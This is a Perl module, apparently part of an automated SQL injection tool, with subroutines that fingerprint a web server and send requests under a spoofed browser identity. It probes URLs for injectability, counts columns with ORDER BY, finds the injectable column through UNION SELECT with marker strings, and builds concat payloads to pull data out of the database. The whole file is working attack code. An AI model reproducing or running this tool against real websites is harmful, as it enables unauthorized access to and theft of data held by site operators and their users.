package SQLData;

# STOPPED AT ERROR-BASED SQLI

use IO::Socket;
use LWP::UserAgent;
use LWP::Protocol::https;
use List::Compare;
use strict;

use parent qw<Exporter>;

our $ua = LWP::UserAgent->new;
our $loopflag;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
$ua->from('admin@google.com');
$ua->timeout(10);
our @EXPORT_OK = qw<$ua $loopflag>;

our @content;


sub getWebServer{
    my $url = shift;
    my $port = shift;
    $url =~ s/\/(.*)//;
    my $buf;
    my $sock = IO::Socket::INET->new(
        PeerAddr => $url,
        PeerPort => $port,
        Proto => "tcp"
    ) || die "Cannot connect to " . $url;
    $sock->send("HEAD / HTTP/1.1\r\n");
    $sock->send("\r\n");
    $sock->send("\r\n");
    $sock->recv($buf, 2048);
    my @buf = split("\n", $buf);
    foreach(@buf){
        if(m/^Server:(.*)/i){
            return "\aWeb Server Found: ", $1, "\n";
        }
    }    
}

sub fetchPage{
    # fetchPage Subroutine 
    # Will modify the page result content or make a request and store the page result to '@content'
    my $url = shift;
    my ($type, $inj) = @_;
    if($url && $type eq "injectcol"){ #injectcol or InjectColumn This function will detect what column number is injectable
        $url =~ s/'-VAR-'/concat('0x031337',$inj,'0x031337')/;
    }elsif($url && $type eq "directinject"){ # Direct inject: concatenates Injection String into URL
        $url .=$inj;
    }elsif($type eq "checkvulnerable"){ # Check if target URL is vulnerable to SQLi
       $url = $url ."%27";    
    }elsif($type eq "directnoinject"){ # Same as Direct Inject but no argument passed to '$inj'
        my $res = $ua->get($url);
        #print $url . "\n";
        if($res->is_success){
            @content = split(/\015?\012/, $res->content);
            return $_[0];
        }
    }else{
        return 0; 
    }
    my $res = $ua->get("http://".$url);
    #print $url . "\n";
    if($res->is_success){
        # if the request is successful, Directly pass the page result into '@content'. So we can parse it with regex and get our desired result
        @content = split(/\015?\012/, $res->content);
        return $_[0]; 
    }   
}

sub parsePage{
    # on fetchPage subroutne we can see that some of our request has been concated with '0x031337'
    foreach(@content){
        if($_ =~ /0x031337(.+)0x031337/){ # this is pretty much self explanatory
            return $1;
        }elsif($_ =~ m/sql/ig){
            return "Positive SQLi Vulnerability";
        }
    }
}

sub colCount{    
    # get the Column count
    my($url,$col,$err) = @_;
    my $totalCol = 0;
    return if $col > 32; 
    # sennd a request with injection string
    fetchPage($url,"directinject", "%20ORDER%20BY%20".$col."--%20");
    foreach(@content){
        # checks content if contains a match
        if(m/unknown.*column.*order/i){
            $col-=1;
            colCount($url,$col, 1); # if not contains do it again
            $totalCol = $col; # if contains a match assign and return
            return $col
        }
    }
    if(!$err){
        $col+=5; # column number not found yet? increment and try again
        print "Col not found! restarting... $col | \n";
        colCount($url,$col,0); 
        return 1;
    }
    return $totalCol;
}
sub injColumn{
    # this subroutine detects which column is injectable
    my($url,$colCount) = @_;
    my $union = "%20union%20select%20";
    my @fields;
    my $injCol;
    my $injectString;
    for(my $i=0;$i<$colCount;$i++){
        my $field = "";
        for(my $j=0;$j<$colCount;$j++){
            if($j == $i){
                $field .= "'-VAR-',";
            }else{
                $field .= "null,";
            }
        }
        push(@fields, $field);
    }
    for(my $i=0;$i<$colCount;$i++){
        $fields[$i] =~ s/,$//;
        fetchPage($url,"directinject",$union.$fields[$i]."%20--%20");
        
        foreach(@content){
            if(m/-VAR-/){  
                $injectString = $url.$union.$fields[$i]."%20--%20";
                $injCol = $i;
                print "Found Injectable column: ", ++$i, "\n";
                return $injCol."---".$injectString;
            }
        }
    }
   return $injCol."---".$injectString;
}

sub modifyInjectionString{
	my($string, $colCount, $injectableCol) = @_;
	my $injP;
	my $concat_str;
	for(my $i=0;$i<$colCount;$i++){
		if($i == $injectableCol){ 
			$concat_str .= "concat('0x031337',";
			$concat_str .= $string;
			$concat_str .= ",'0x031337'), ";
			#$concat_str =~ s/,$//;
			$injP .= $concat_str;
		}else{
			$injP.='null,';
		}
	}
	$injP =~ s/,$//;
	return $injP;
}

1;